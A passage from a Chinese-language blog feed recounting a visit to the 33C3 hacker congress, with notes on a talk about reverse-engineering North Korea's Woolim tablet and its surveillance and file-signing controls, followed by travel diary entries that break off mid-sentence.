&lt;p&gt;&lt;img alt="lock picking" src="/files/33c3/lock-picking.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;一開始我拿了一個挺普通的鎖頭嘗試，&lt;br /&gt;
花了超過半小時的時間都開不了。&lt;br /&gt;
只好放棄然後拿被空出來的透明鎖頭練習，&lt;br /&gt;
能夠順利解鎖透明鎖頭 5 次以後，&lt;br /&gt;
大概掌握到訣竅之後，&lt;br /&gt;
就轉回嘗試不透明的一般鎖頭，&lt;br /&gt;
後來成功開啟了兩個，&lt;br /&gt;
從頭到尾從坐下到離開大概花了兩個小時吧，&lt;br /&gt;
現場還有些難度較高且種類不同的鎖頭我沒時間嘗試。  &lt;/p&gt;
&lt;p&gt;Workshop 現場就有在販賣開鎖工具組，&lt;br /&gt;
最便宜的一組要價是 15 歐，&lt;br /&gt;
之後比較貴的就是工具多一點然後加上個皮套件的包裝這樣，&lt;br /&gt;
我覺得挺有趣的，&lt;br /&gt;
所以就買了最便宜的 15 歐那組。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Untrusting of CPU: A proposal for secure computing in an age where we cannot trust our CPUs anymore&lt;/h3&gt;
&lt;p&gt;這場演講主要就是在講說他設計了一個系統可以增加電腦計算的可靠性與安全性，&lt;br /&gt;
但前面主要都是在講說到底電腦有哪些缺陷造成其不可靠性及不安全性，&lt;br /&gt;
但我聽起來是挺枯燥的，&lt;br /&gt;
講了半個小時大概都沒有講到重點，&lt;br /&gt;
期間也有不少人相繼離席，&lt;br /&gt;
後來我也覺得沒什麼收穫，&lt;br /&gt;
所以也在中途離開去逛社群攤位了。  &lt;/p&gt;
&lt;p&gt;有興趣的人一樣可以參考影片： &lt;a href="https://media.ccc.de/v/33c3-8014-untrusting_the_cpu"&gt;https://media.ccc.de/v/33c3-8014-untrusting_the_cpu&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;逛攤位&lt;/h3&gt;
&lt;p&gt;CCC 把他們的社群稱為 Assembly 而不是 Community，&lt;br /&gt;
就是一群人組合在一起的意思嘛。  &lt;/p&gt;
&lt;p&gt;現場有非常多各式各樣的社群，&lt;br /&gt;
除了開鎖的以外，&lt;br /&gt;
還有 VR、互動裝置、焊接、電子看板、3D 列印、雷射雕刻、無線電、嵌入式裝置...等等，&lt;br /&gt;
也有程式語言相關的 Rust, Python, Ruby，&lt;br /&gt;
現場甚至有個傢伙在使用 &lt;a href="https://en.wikipedia.org/wiki/Commodore_64"&gt;Commodore 64&lt;/a&gt;。&lt;br /&gt;
還有很多一直盯著 IBM ThinkPad 螢幕不斷飛快敲打鍵盤的傢伙，&lt;br /&gt;
但你不知道他們在幹嘛就是。&lt;br /&gt;
會場到處都可以看到有人席地而坐，&lt;br /&gt;
然後就開始 coding 或開始討論程式碼，&lt;br /&gt;
當然也有很多人是聊各式各樣和資訊相關的議題與技術就是。  &lt;/p&gt;
&lt;p&gt;這部份在最後一篇的總結會再描述的詳細些。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Woolim - Lifting the Fog on DPRK's Latest Tablet PC&lt;/h3&gt;
&lt;p&gt;這個應該是我第一天聽到最酷的議程了，&lt;br /&gt;
講的是他們透過了一些特殊管道拿到了一台北韓政府發給北韓人民使用的平板電腦，&lt;br /&gt;
然後他們透過哪些方法去逆向工程這台平板，&lt;br /&gt;
發現了哪些有趣的東西，&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;這個平板其實是中國製造的。  &lt;ul&gt;
&lt;li&gt;所以裏面有 Google 拼音輸入法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個平板會在使用者每次開啟 App 的時候都做截圖，然後把截圖送到北韓官方的伺服器。  &lt;ul&gt;
&lt;li&gt;他們有去 trace 往哪邊送，但發現 IP 基本上都是使用內網 IP。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個平板產生的檔案無法分享給其他同款平板的使用者，也無法分享給其他北韓的電子裝置，也無法接收來自其他國家的檔案。  &lt;ul&gt;
&lt;li&gt;他們去研究其加密及如何實作的機制  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;甚至還拿到了這個平板的廣告影片，&lt;br /&gt;
現場就播放了這個廣告影片給大家看，&lt;br /&gt;
廣告影片的時間挺長的，&lt;br /&gt;
我估計大概有 5 分鐘吧，&lt;br /&gt;
廣告的內容就在講說這個平板有哪些功能，&lt;br /&gt;
然後畫面很像台灣七零年代的感覺。  &lt;/p&gt;
&lt;p&gt;影片在此 &lt;a href="https://media.ccc.de/v/33c3-8143-woolim_lifting_the_fog_on_dprk_s_latest_tablet_pc"&gt;https://media.ccc.de/v/33c3-8143-woolim_lifting_the_fog_on_dprk_s_latest_tablet_pc&lt;/a&gt;  &lt;/p&gt;
&lt;h4&gt;Woolim&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Name of waterfall in DPRK  &lt;/li&gt;
&lt;li&gt;One of probably 4 Tablet PCs from DPRKs  &lt;/li&gt;
&lt;li&gt;Manufacturer  &lt;ul&gt;
&lt;li&gt;Hoozo in China  &lt;/li&gt;
&lt;li&gt;Z100  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SImilar products sell for ~180 EUR to ~260 EUR  &lt;/li&gt;
&lt;li&gt;Software from/modified by DPRK  &lt;/li&gt;
&lt;li&gt;南韓朋友幫忙拿到 Woolim 在北韓的廣告影片，現場播放。  &lt;ul&gt;
&lt;li&gt;背景音樂也太熱血 XDDD  &lt;/li&gt;
&lt;li&gt;廣告超級久啊，大概快五分鐘了吧。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Don't drive and watch TV (XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;Free Warranty service  &lt;/li&gt;
&lt;li&gt;Remember RedStar AV (Anti-virus)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Hardware&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;System Information  &lt;ul&gt;
&lt;li&gt;Allwinner A33 [ARMv7] SoC  &lt;/li&gt;
&lt;li&gt;8GB SK Hynix flash  &lt;/li&gt;
&lt;li&gt;MicroSD and power plug  &lt;/li&gt;
&lt;li&gt;Not so responsive touchscreen  &lt;/li&gt;
&lt;li&gt;no communication interfaces  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;USB peripherals available  &lt;ul&gt;
&lt;li&gt;Modem  &lt;/li&gt;
&lt;li&gt;WiFi  &lt;/li&gt;
&lt;li&gt;LAN  &lt;/li&gt;
&lt;li&gt;DVB-T  &lt;/li&gt;
&lt;li&gt;HDMI [?]  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Software&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Android 4.4.2  &lt;/li&gt;
&lt;li&gt;Kernel 3.4.39  &lt;/li&gt;
&lt;li&gt;Build: Sep 10, 2015  &lt;/li&gt;
&lt;li&gt;Preinstalled applications  &lt;ul&gt;
&lt;li&gt;Camera  &lt;/li&gt;
&lt;li&gt;"Education"  &lt;/li&gt;
&lt;li&gt;Games  &lt;/li&gt;
&lt;li&gt;Browser  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Built-in apps  &lt;ul&gt;
&lt;li&gt;谷歌拼音輸入法  &lt;/li&gt;
&lt;li&gt;Flash  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;Microsoft Office  &lt;/li&gt;
&lt;li&gt;ODF  &lt;/li&gt;
&lt;li&gt;有個類似 SimCity 的 App，可以畫房屋的建築圖。  &lt;/li&gt;
&lt;li&gt;Cooking Application  &lt;/li&gt;
&lt;li&gt;TraceViewer  &lt;ul&gt;
&lt;li&gt;Took pictures whenever you open the app and send to server.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Internal Storage  &lt;ul&gt;
&lt;li&gt;無法開啟外來的檔案，會顯示：It is not signed file.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Application Demos&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;NAC  &lt;ul&gt;
&lt;li&gt;Probably used for a access to Kwangmyong  &lt;/li&gt;
&lt;li&gt;PANA / PPPoE / Dialup  &lt;/li&gt;
&lt;li&gt;Login credentials  &lt;/li&gt;
&lt;li&gt;Different access points for different groups  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Red Flag  &lt;ul&gt;
&lt;li&gt;Schedules thread  &lt;/li&gt;
&lt;li&gt;Takes screenshots in the background  &lt;/li&gt;
&lt;li&gt;Logs the Browser history  &lt;/li&gt;
&lt;li&gt;Get IMEI, IMSI and &lt;code&gt;android_id&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Copies key material  &lt;/li&gt;
&lt;li&gt;"Integrity Check" for files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Gaining Access&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;They really lock the tablet excellently.  &lt;/li&gt;
&lt;li&gt;The obvious things  &lt;ul&gt;
&lt;li&gt;ADB enabled? =&amp;gt; NO  &lt;/li&gt;
&lt;li&gt;Can we enable it? =&amp;gt; NO  &lt;/li&gt;
&lt;li&gt;Developer options? =&amp;gt; NO  &lt;/li&gt;
&lt;li&gt;Can we install APKs? =&amp;gt; NO  &lt;/li&gt;
&lt;li&gt;Is there a recovery/reset mode? =&amp;gt; NO  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The more advanced things  &lt;ul&gt;
&lt;li&gt;File open dialogs in Apps  &lt;/li&gt;
&lt;li&gt;Attacks via archives  &lt;ul&gt;
&lt;li&gt;Symlinks  &lt;/li&gt;
&lt;li&gt;Directory Traversal  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Suspicious shell commands in configuration files  &lt;/li&gt;
&lt;li&gt;Java Deserialization for Tetris  &lt;ul&gt;
&lt;li&gt;Wrote by a Chinese guy  &lt;/li&gt;
&lt;li&gt;Got the source code  &lt;/li&gt;
&lt;li&gt;Serialize Java object into SD card  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flash application  &lt;/li&gt;
&lt;li&gt;XLS macro injections  &lt;/li&gt;
&lt;li&gt;even more...  &lt;/li&gt;
&lt;li&gt;None of these works  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Exploits? Vulnerabilities?  &lt;/li&gt;
&lt;li&gt;Avoid Hardware Tampering  &lt;/li&gt;
&lt;li&gt;Might find a way  &lt;ul&gt;
&lt;li&gt;PhoenixCard  &lt;ul&gt;
&lt;li&gt;Create Bootable Images for Allwinner Devices  &lt;/li&gt;
&lt;li&gt;Put this SD card in and it actually worked.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;After the bootable SD card worked.  &lt;ul&gt;
&lt;li&gt;Linux kernel, but no way to access memory.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What to do next?  &lt;ul&gt;
&lt;li&gt;Test Environment  &lt;ul&gt;
&lt;li&gt;Cheap (about 30 bucks) A33 Tablet with similar functionality  &lt;/li&gt;
&lt;li&gt;It worked and dumped out the storage layout.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Distribution of Media files in DPRK: Achieving absolute control&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Multiple Ways of Tracing Media Distribution  &lt;ul&gt;
&lt;li&gt;Watermarking introduced in Red Star OS  &lt;ul&gt;
&lt;li&gt;Append simple watermarks to media files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Compatible code available on Woolim  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Red Star OS Watermarking Recap  &lt;ul&gt;
&lt;li&gt;Plaintext: WMB48Z789B3AZ97  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;takeshixx/redstar-tools&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tracking the Distribution of Media Files  &lt;ul&gt;
&lt;li&gt;Create social networks  &lt;/li&gt;
&lt;li&gt;Construct connections between dissidents  &lt;/li&gt;
&lt;li&gt;Track down sources  &lt;/li&gt;
&lt;li&gt;Shutdown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Woolim is More Restrictive than Red Star OS  &lt;ul&gt;
&lt;li&gt;Introduces file signatures  &lt;ul&gt;
&lt;li&gt;Using asymmetric cryptography [RSA]  &lt;/li&gt;
&lt;li&gt;Goal: PREVENT the distribution of media files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Government has full control over signatures  &lt;ul&gt;
&lt;li&gt;Absolute control over media sources  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Signature Checking  &lt;ul&gt;
&lt;li&gt;Java interface with native JNI library [gov.no.media.Sign]  &lt;ul&gt;
&lt;li&gt;Called by apps e.g. during file opening/saving  &lt;/li&gt;
&lt;li&gt;Sometimes concealed as "License checks"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multiple ways of signing  &lt;ul&gt;
&lt;li&gt;NATSIGN  &lt;/li&gt;
&lt;li&gt;SELFSIGN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Files without proper signatures are forbidden.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Java Native Interface Libraries  &lt;ul&gt;
&lt;li&gt;Check if file has a proper signature  &lt;/li&gt;
&lt;li&gt;Used by various applications, e.g.:  &lt;ul&gt;
&lt;li&gt;FileBrowser.apk  &lt;/li&gt;
&lt;li&gt;Gallery2.apk  &lt;/li&gt;
&lt;li&gt;Music.apk  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NATSIGN  &lt;ul&gt;
&lt;li&gt;Files that have been approved by the government  &lt;ul&gt;
&lt;li&gt;Also referred to as "gov_sign"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Files are signed with a 2048 bit RSA key  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SELFSIGN  &lt;ul&gt;
&lt;li&gt;Combination of  &lt;ul&gt;
&lt;li&gt;Symmetric encryption [Rijndael 256]  &lt;/li&gt;
&lt;li&gt;Asymmetric signatures [RSA]  &lt;/li&gt;
&lt;li&gt;Hashing [SHA224/SHA256]  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Device identity stored in &lt;code&gt;/data/local/tmp/legalref.dat&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Comprised of IMEI and IMSI  &lt;/li&gt;
&lt;li&gt;Each device's... legal reference  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Files created on the device itself can be opened  &lt;ul&gt;
&lt;li&gt;Camera images, office documents, PDFs, etc.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Signatures  &lt;ul&gt;
&lt;li&gt;RSA signature of file hash  &lt;/li&gt;
&lt;li&gt;Encrypted device identity  &lt;ul&gt;
&lt;li&gt;Rijndael 256 (key and blocks)  &lt;/li&gt;
&lt;li&gt;IMEI and IMSI  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Trailer  &lt;ul&gt;
&lt;li&gt;Signature size  &lt;/li&gt;
&lt;li&gt;ASCII suffix "SELFSIGN"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FIxed size of 792 bytes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;File types affected by signing  &lt;ul&gt;
&lt;li&gt;All kinds of media files  &lt;/li&gt;
&lt;li&gt;Text and HTML files  &lt;/li&gt;
&lt;li&gt;Even APKs...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h6&gt;Absolute Control of Woolim's Media Sources&lt;/h6&gt;
&lt;ul&gt;
&lt;li&gt;NATSIGN  &lt;ul&gt;
&lt;li&gt;Approved by the government  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SELFSIGN  &lt;ul&gt;
&lt;li&gt;Created on the device itself  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Can not be shared to  &lt;ul&gt;
&lt;li&gt;Other Woolim tablet PCs  &lt;/li&gt;
&lt;li&gt;Other devices in DPRK  &lt;/li&gt;
&lt;li&gt;Rest of World  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Supporters&lt;/h5&gt;
&lt;p&gt;ISFINK  &lt;/p&gt;
&lt;h5&gt;Future Work&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Free some of the stuff from the tablet  &lt;ul&gt;
&lt;li&gt;Dictionaries  &lt;/li&gt;
&lt;li&gt;Books  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Q&amp;amp;A&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;OS occupied about 1GB on Woolim  &lt;/li&gt;
&lt;li&gt;Won't provice the dump of this device because it may put the owner of this device in danger.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;補充&lt;/h4&gt;
&lt;p&gt;對北韓有興趣的人，&lt;br /&gt;
可以參考壹電視新聞台的陳雅琳記者於 2016 年進入北韓的報導，&lt;br /&gt;
個人覺得搭配這個演講看應該會挺有趣的。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=aQOLW5gnca0"&gt;「探祕北韓」特別報導（上集） - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=m8iVmdc3kqc"&gt;「探祕北韓」特別報導（下集） - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/28/33c3-2"&gt;33C3 (2)&lt;/a&gt;  &lt;/p&gt;</summary><category term="33C3"></category><category term="Chaos Communication Congress"></category><category term="CCC"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (8)</title><link href="https://blog.m157q.tw/posts/2016/12/27/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-8/" rel="alternate"></link><published>2017-01-15T00:57:59+08:00</published><updated>2017-01-15T00:57:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-27:posts/2016/12/27/33c3-暨歐洲法荷德聖誕跨年遊-8/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/26/33c3-暨歐洲法荷德聖誕跨年遊-7"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (7)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 8 2016/12/27 Tue&lt;/h2&gt;
&lt;p&gt;有關 CCC 的簡介請參考：&lt;a href="/posts/2016/12/27/33c3-0"&gt;33C3 intro&lt;/a&gt;&lt;br /&gt;
有關本日 CCC 議程相關紀錄請參閱：&lt;a href="/posts/2016/12/27/33c3-day1"&gt;33C3 Day 1&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;早上地鐵搭一站到 CCH (Congress Center Hamburg) 漢堡會議中心旁的車站之後，&lt;br /&gt;
就準時參加 CCC，&lt;br /&gt;
直到快凌晨兩點已經沒地鐵回漢堡車站了，&lt;br /&gt;
所以走路回旅館，&lt;br /&gt;
順便欣賞一下漢堡的夜景，&lt;br /&gt;
從橋上看湖與城市的夜景也算是另一種感覺。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/28/33c3-暨歐洲法荷德聖誕跨年遊-9"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (9)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Hamburg"></category></entry><entry><title>33c3 intro</title><link href="https://blog.m157q.tw/posts/2016/12/27/33c3-0/" rel="alternate"></link><published>2017-01-23T23:25:07+08:00</published><updated>2017-01-23T23:25:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-27:posts/2016/12/27/33c3-0/</id><summary type="html">&lt;p&gt;&lt;img alt="light logo of 33C3 on the building" src="/files/33c3/light-logo.jpg" /&gt;&lt;br /&gt;
（主辦單位直接在隔壁的飯店大樓打上了代表這次主題的燈光。照片逆時鐘旋轉了 90 度。）  &lt;/p&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;先科普一下，&lt;br /&gt;
以下的駭客 (Hacker) 指的都是原本的定義：「對某種技術極度熱愛且掌握程度非常專精的人」，&lt;br /&gt;
而不是後來被世人誤用的：「專門利用電腦網路搞破壞或是竊取他人資料的人」，&lt;br /&gt;
後者的正確名稱應該是 Cracker 而不是 Hacker，&lt;br /&gt;
當然，&lt;br /&gt;
不排除 Hacker 裏面也有心術不正者，&lt;br /&gt;
進而利用其專精的技術搞破壞的 Cracker 或是 Black/Gray Hat 存在就是。  &lt;/p&gt;
&lt;p&gt;進入正題，&lt;br /&gt;
33C3 其實是 33rd Chaos Communication Congress 的簡稱，&lt;br /&gt;
硬要用中文翻的話就是「第三十三屆混亂通訊大會」，&lt;br /&gt;
不過個人覺得這個翻譯太不到位也太長了，&lt;br /&gt;
然後以下的稱呼直接省略屆數，&lt;br /&gt;
稱呼為 CCC。  &lt;/p&gt;
&lt;p&gt;首先，&lt;br /&gt;
這是一個駭客年會，&lt;br /&gt;
在西元 2016 年舉辦了第 33 屆，&lt;br /&gt;
所以稍微推算一下，&lt;br /&gt;
第 1 屆舉辦的時間是在 1984 年，&lt;br /&gt;
在德國的漢堡 (Hamburg) 舉辦，&lt;br /&gt;
1998 年改成在德國的柏林 (Berlin) 舉辦，&lt;br /&gt;
2012 年又改回在 Hamburg 舉辦，&lt;br /&gt;
每屆都是在年底的時候舉辦。&lt;br /&gt;
2016 年的年會會場也是在 Hamburg，&lt;br /&gt;
地點則是漢堡會議中心（Congress Center Hamburg，簡稱 CCH)，&lt;br /&gt;
主辦方在會議期間就很乾脆的把 CCH 這棟建築的標誌中的 H 用一個 C 蓋掉，&lt;br /&gt;
順理成章的當成自己的。  &lt;/p&gt;
&lt;p&gt;CCC 目前已經是歐洲規模最大的駭客年會了，&lt;br /&gt;
2015 年約有 13,000 人參加，&lt;br /&gt;
2016 年則約有 15,000 人參加。&lt;br /&gt;
而會議的議題主要圍繞於和資訊安全、個人隱私、網路自由相關的技術性或者政治性議題，&lt;br /&gt;
再加上各式各樣的社群所舉辦的 workshop 或 self-host session，&lt;br /&gt;
還有其他一言難盡的項目&lt;br /&gt;
（例如：CTF, 現場談話性節目，Speaker's Sofa, 有人自幹的作品帶來現場 demo, 酒吧, 有 DJ 的 Lounge bar, ... 等等）所組成。&lt;br /&gt;
想瞭解一下這個歐洲最大的年度駭客會議可以參考一下&lt;a href="https://en.wikipedia.org/wiki/Chaos_Communication_Congress"&gt;維基百科的介紹&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;CCC 的主辦方是 &lt;a href="http://www.ccc.de/en/?language=en"&gt;Chaos Computer Club&lt;/a&gt;，&lt;br /&gt;
簡稱也叫 CCC，&lt;br /&gt;
成立於 1981 年，&lt;br /&gt;
主要根據地及參與者都在德國，&lt;br /&gt;
是歐洲最大的駭客組織，&lt;br /&gt;
想瞭解更多的話可以參考&lt;a href="https://en.wikipedia.org/wiki/Chaos_Computer_Club"&gt;維基百科的介紹&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;至於為什麼會來參加這個全歐洲最大的年度駭客會議 Chaos Communication Congress，&lt;br /&gt;
想知道的人請參考&lt;a href="/posts/2016/12/20/33c3-暨歐洲法荷德聖誕跨年遊-0"&gt;另外一篇文章的前言&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;以下會有兩個部份，&lt;br /&gt;
其一為我參加了四天會議(2016/12/27~30)的紀錄，總共分為 4 篇。&lt;br /&gt;
其二為我對這次參加 CCC 的總結，包含我看到的東西與想法，紀錄在這系列的第 5 篇。  &lt;/p&gt;
&lt;p&gt;然後因為大會有規定拍照的時候，&lt;br /&gt;
必須確認所有會入鏡的人都願意入鏡才可以拍攝，&lt;br /&gt;
基本上就是不鼓勵你隨便拍別人的意思，&lt;br /&gt;
所以接下來看到我拍的照片基本上都不會有人入鏡。&lt;br /&gt;
（就算有的話也會是背影或是非常模糊啦，先打預防針 XD）  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Ask before taking photo" src="/files/33c3/ask-before-taking-photo.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/27/33c3-1"&gt;33C3 (1)&lt;/a&gt;  &lt;/p&gt;</summary><category term="33C3"></category><category term="Chaos Communication Congress"></category><category term="CCC"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (7)</title><link href="https://blog.m157q.tw/posts/2016/12/26/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-7/" rel="alternate"></link><published>2017-01-15T00:53:59+08:00</published><updated>2017-01-15T00:53:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-26:posts/2016/12/26/33c3-暨歐洲法荷德聖誕跨年遊-7/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/25/33c3-暨歐洲法荷德聖誕跨年遊-6"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (6)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 7 2016/12/26 Mon&lt;/h2&gt;
&lt;p&gt;今天沒啥特別的，&lt;br /&gt;
早上起來吃完跟昨天一樣的飯店自助式早餐後，&lt;br /&gt;
就去飯店外面搭 FlixBus 前往德國漢堡。&lt;br /&gt;
阿姆斯特丹今天的天氣很好，&lt;br /&gt;
但風依然一樣大，&lt;br /&gt;
因為巴士誤點，&lt;br /&gt;
所以在外面吹了一陣子冷風才上巴士。&lt;br /&gt;
結果一上巴士後，&lt;br /&gt;
有位外國女生看到我們 4 個東方人面孔，&lt;br /&gt;
馬上用中文問我們從哪裡來，&lt;br /&gt;
然後說她這五年都待在北京，&lt;br /&gt;
跟她說我們都從台灣來以後，&lt;br /&gt;
大家就各自就坐，&lt;br /&gt;
之後就是長達七個多小時的搭車時間。&lt;br /&gt;
大部份時間都在睡覺，&lt;br /&gt;
偶爾看看風景和拿出筆電紀錄這趟旅程。  &lt;/p&gt;
&lt;p&gt;窗外的風景挺美的，&lt;br /&gt;
不同於台灣鄉間的那種自然美，&lt;br /&gt;
平坦的草原上偶爾坐落幾間木造房，&lt;br /&gt;
樹葉落光的枯樹像電影放映似的不斷在窗外後退著，&lt;br /&gt;
坐在我右手邊的一位女生靠著巴士的窗戶，&lt;br /&gt;
手上正拿著書在閱讀著，&lt;br /&gt;
我拿起手機將這一幕拍了下來。&lt;br /&gt;
偶爾往窗外看總會看到一大群的綿羊正在草原上吃草，&lt;br /&gt;
起初沒仔細看時還以為是豬，圓嘟嘟的。&lt;br /&gt;
歐洲天黑的早，高速公路上又沒有照明設施，只好睡覺。&lt;br /&gt;
約莫於晚上七點多抵達漢堡車站，&lt;br /&gt;
下車時，&lt;br /&gt;
那位講中文的外國女生問我們怎麼會來漢堡，&lt;br /&gt;
我們跟他說明來參加 CCC 後，&lt;br /&gt;
她很開心的跟我們說她也是，&lt;br /&gt;
而且她還是去年的講者，&lt;br /&gt;
跟我們講了她去年的演講題目，&lt;br /&gt;
是關於中國網路文化的研究。&lt;br /&gt;
於是她加了我們其中一位有 WhatsApp 的人，&lt;br /&gt;
互道 See You Later 之後，&lt;br /&gt;
我們就前往車站附近的 Hostel 入住。  &lt;/p&gt;
&lt;p&gt;安頓好行李後，&lt;br /&gt;
並和另外一位剛好在德國旅遊的朋友會合後，&lt;br /&gt;
一夥人到附近覓食，&lt;br /&gt;
這邊的聖誕市集似乎更多，&lt;br /&gt;
大概跟台灣的夜市一樣的感覺，&lt;br /&gt;
也有可能是市集本來就在，&lt;br /&gt;
只是因為聖誕假期的關係做了聖誕節相關的裝飾。&lt;br /&gt;
點了 Pita 和熱紅酒之後，&lt;br /&gt;
天空開始下起了大雨，&lt;br /&gt;
